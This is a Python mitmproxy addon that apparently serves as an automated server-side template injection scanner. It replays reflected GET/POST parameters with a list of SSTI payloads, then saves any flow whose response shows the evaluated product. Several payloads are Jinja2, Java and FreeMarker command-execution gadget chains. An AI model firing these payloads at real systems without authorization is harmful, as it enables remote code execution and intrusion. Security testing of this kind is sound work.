from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
import json
import re
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor

class SSTIResponse:
    def __init__(self):
        self.scope = "example.com"
        self.flow_dir_ssti = "ssti_flows"
        os.makedirs(self.flow_dir_ssti, exist_ok=True)
        self.hashes_file_path = os.path.join(self.flow_dir_ssti, "request_hashes.txt")
        self.processed_requests = self.load_processed_requests()
        self.alteration_indicators_ssti = ["{{95459879*95459879}}", "${95459879*95459879}", "<%= 95459879*95459879 %>", "#{95459879*95459879}", "*{95459879*95459879}", "{{'95459879'|multiply('95459879')}}", "{math equation=\"95459879*95459879\"}", "{{config.items()}}", "#set($x = 95459879*95459879)", "<#assign x=95459879*95459879>${x}", "${95459879*95459879}", "${95459879*95459879}", "{{95459879*'95459879'}}", "{{95459879*'95459879'}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('95459879*95459879').read()}}", "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('95459879*95459879').read()}}", "{{config.__class__.__init__.__globals__['os'].popen('95459879*95459879').read()}}", "{{''.__class__.mro()[2].__subclasses__()[40]('95459879*95459879').read()}}", "{{''.__class__.mro()[1].__subclasses__()[396]('95459879*95459879',shell=True,stdout=-1).communicate()}}", "<%= debug('95459879*95459879') %>", "#{T(java.lang.Runtime).getRuntime().exec('95459879*95459879')}", "#if($x == '95459879*95459879')true#{end}", "<#list .data_model?keys as key>${'95459879*95459879'}</#list>", "<#assign command=\"freemarker.template.utility.Execute\"?new()>${command('95459879*95459879')}", "${\"freemarker.template.utility.Execute\"?new()('95459879*95459879')}", "{{95459879*'95459879'}}", "{{ '95459879'*95459879 }}", "{{request.application.__globals__.__builtins__.__import__('os').popen('95459879*95459879').read()}}", "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('95459879*95459879')['read']()}}", "{{''.__class__.__mro__[2].__subclasses__()[40]('95459879*95459879').read()}}", "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null, '95459879*95459879')}"]
        self.altered_header_ssti = "x-altered-ssti"
        self.params_string = ""

    def load_processed_requests(self):
        try:
            with open(self.hashes_file_path, 'r') as file:
                return set(line.strip() for line in file)
        except FileNotFoundError:
            return set()

    def save_processed_request(self, request_hash):
        with open(self.hashes_file_path, 'a') as file:
            file.write(f"{request_hash}\n")

    def request_hash(self, flow, params_string):
        method = flow.request.method
        url = flow.request.url
        request_str = f"{method}{url}{params_string}"
        self.params_string = ""
        return hashlib.sha256(request_str.encode('utf-8')).hexdigest()

    def response(self, flow: http.HTTPFlow) -> None:

        #in Scope
        Hostscope = flow.request.headers.get("Host", "")
        if self.scope not in Hostscope:
            return

        
         #--- first phase check the method request ---
        if self.altered_header_ssti in flow.request.headers:
            self.check_altered_reflection_ssti(flow)
            return


        if flow.request.method == "GET":
            method = flow.request.method

            self.process_parameters_ssti(flow, flow.request.query, method)
        elif flow.request.method == "POST":
            method = flow.request.method
            self.process_post_request_ssti(flow, method)

         #--- end first phase check the method request ---

    # ---- the porcess parameter called when is POST or GET
                
    def process_parameters_ssti(self, flow, params, method):
        content_type = flow.request.headers.get("Content-Type", "")
        if method == "POST":
            all_processed_items = self.if_content_is_json_dic(params)
            for key, content in all_processed_items.items():
                self.params_string += str(key)
            request_id = self.request_hash(flow, self.params_string)
            if request_id in self.processed_requests:
                ctx.log.info("Duplicate request detected, skipping...")
                return
            self.processed_requests.add(request_id)
            self.save_processed_request(request_id)

            for key, content in all_processed_items.items():
                if str(content) in flow.response.text:
                    self.handle_reflection_ssrf(flow, key)


        elif method == "GET":
            for param, value in params.items():
                self.params_string += str(param)
            
            request_id = self.request_hash(flow, self.params_string)
            if request_id in self.processed_requests:
                ctx.log.info("Duplicate request detected, skipping...")
                return
            self.processed_requests.add(request_id)
            self.save_processed_request(request_id)
            for param, value in params.items():
                try:
                    orginalgetparam = param
                    decoded_json = json.loads(unquote(value))
                    if isinstance(decoded_json, dict) or isinstance(decoded_json, list):
                        all_processed_items = self.if_content_is_json_dic(decoded_json)

                        for key, content in all_processed_items.items():
                            if str(content) in flow.response.text:
                                self.handle_reflection_ssrf(flow, key, decoded_json, orginalgetparam)
                except:
                    if str(value) in flow.response.text:
                        self.handle_reflection_ssrf(flow, param)


    # ---- -------------------end of the function------------------ ------- -----------

    # ---- porcess post request ssti ----------------------------------------

    def process_post_request_ssti(self, flow, method):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type or "text/plain" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            #params = self.normalize_query_params(params)
            self.process_parameters_ssti(flow, params, method)
        elif "json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):

                    self.process_parameters_ssti(flow, params, method)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    # ---- ------------------end function ----------------------------------------
#---- ---------------- if_content_is_json_dic -----------------------------
   
    def if_content_is_json_dic(self, params, parent_key=''):
        processed_items = {}
        if isinstance(params, dict):
            for key, value in params.items():
                compound_key = f"{parent_key}.{key}" if parent_key else key
                processed_items.update(self.if_content_is_json_dic(value, compound_key))
        elif isinstance(params, list):
            for index, item in enumerate(params):
                compound_key = f"{parent_key}[{index}]"
                processed_items.update(self.if_content_is_json_dic(item, compound_key))
        else:
            # Attempt to parse a JSON-encoded string into a dict or list
            if isinstance(params, str):
                try:
                    parsed_json = json.loads(params)
                    # Recursively process the parsed JSON
                    return self.if_content_is_json_dic(parsed_json, parent_key)
                except json.JSONDecodeError:
                    # Not a JSON string, treat as a base case
                    pass
            # Base case: param is neither a dict, list, nor JSON string
            processed_items[parent_key] = params
        return processed_items

#---- ---------------- end of function -----------------------------

#---- ----------handle reflection function -----------------------------

    def handle_reflection_ssrf(self, flow, param, dictoniry=None, orginalgetparam=None):
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Logic to handle the reflection, e.g., logging, altering, and replaying
            for indicator in self.alteration_indicators_ssti:
                executor.submit(self.alter_and_replay_ssti, flow, param, indicator, dictoniry, orginalgetparam)


#---- ----------end of handle reflection function -----------------------------


#---- ---------- alter_and_replay_ssti function -----------------------------
    def alter_and_replay_ssti(self, original_flow, param, indicator, dictoniry, orginalgetparam):
        altered_value = indicator
        altered_flow = self.alter_request_ssti(original_flow, param, altered_value, dictoniry, orginalgetparam)
        if altered_flow:
            ctx.master.commands.call("replay.client", [altered_flow])
#---- ---------- end alter_and_replay_ssti function -----------------------------

#---- ---------- set_nested_value function -----------------------------

    def set_nested_value(self, dct, compound_key, value):
        keys = compound_key.split('.')
        for i, key in enumerate(keys):
            if '[' in key and ']' in key:  # Handle list indices within the key
                list_key, index_part = key.split('[')
                index = int(index_part[:-1])  # Remove the ']' and convert to int

                if i == 0:  # Special handling for the first key if it's a list
                    element = dct.get(list_key, [])[index]
                    if isinstance(element, str):  # Check if element is a JSON string
                        if i < len(keys) - 1:  # More keys to navigate
                            parsed_element = json.loads(element)
                            self.set_nested_value(parsed_element, '.'.join(keys[i+1:]), value)  # Recurse
                            dct[list_key][index] = json.dumps(parsed_element)  # Update with modified JSON
                            return
                        else:  # Last key, direct update
                            dct[list_key][index] = value
                            return
                    else:  # If not a string, normal list handling
                        if i < len(keys) - 1:  # Not the last key, so just navigate
                            dct = element
                        else:  # Last key, direct update
                            dct[list_key][index] = value
                            return
                else:  # For nested lists within the structure
                    if i < len(keys) - 1:  # Not the last key, navigate
                        dct = dct[list_key][index]
                    else:  # Last key, update directly
                        dct[list_key][index] = value
            else:  # Handle normal dictionary keys
                if i < len(keys) - 1:  # Not the last key, navigate or create dict
                    dct = dct.setdefault(key, {})
                else:  # Last key, update value
                    dct[key] = value

#---- ---------- end of set_nested_value function -----------------------------

#---- ---------- alter_request_ssti function -----------------------------

    def alter_request_ssti(self, original_flow, param, altered_value, dictoniry, orginalgetparam):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            if dictoniry:
                if isinstance(dictoniry, list):  # Ensure the dictionary is actually a list
                    try:
                        # Extract indices from the param string, e.g., "[1][3]" -> [1, 3]
                        indices = [int(index.strip('[]')) for index in param.split('][')]
                        body = json.loads(new_request.query[orginalgetparam])
                        target = body
                        # Navigate through the nested structure up to the last index
                        for index in indices[:-1]:
                            target = target[index]
                        # Use the last index to set the new value
                        last_index = indices[-1]
                        if 0 <= last_index < len(target):
                            target[last_index] = altered_value
                            new_request.query[orginalgetparam] = json.dumps(body)  # Update the query parameter
                        else:
                            print("Index out of range.")
                    except (ValueError, IndexError, TypeError) as e:
                        print(f"Error processing nested indices: {e}")
                else:
                    body = json.loads(new_request.query[orginalgetparam])
                    self.set_nested_value(body, param, altered_value)  # Use the utility function here
                    new_request.query[orginalgetparam] = json.dumps(body)
            else:
                new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type or "text/plain" in content_type:
                try:
                    params = urllib.parse.parse_qs(new_request.get_text())
                    self.set_nested_value(params, param, altered_value)
                    new_request.text = urllib.parse.urlencode(params, doseq=True)
                except json.JSONDecodeError:
                    params[orginalgetparam] = [altered_value]
                    new_request.text = urllib.parse.urlencode(params, doseq=True)
                    pass
                    
            elif "json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    self.set_nested_value(body, param, altered_value)  # Use the utility function here
                    new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass

        new_request.headers[self.altered_header_ssti] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

#---- ---------- end alter_request_ssti function -----------------------------

#---- ---------- check_altered_reflection_ssti function -----------------------------
    def check_altered_reflection_ssti(self, flow):
        pattern = re.compile(r'9112588498694640')  # Example pattern, adjust as needed
        if pattern.search(flow.response.text):
            self.save_flow_ssti(flow)
#---- ---------- end check_altered_reflection_ssti function -----------------------------

#---- ---------- save_flow_ssti function -----------------------------
    def save_flow_ssti(self, flow):
        filename = os.path.join(self.flow_dir_ssti, f"{flow.request.method}_captured_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved ssti flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")
#---- ---------- end save_flow_ssti function -----------------------------
        

addons = [SSTIResponse()]

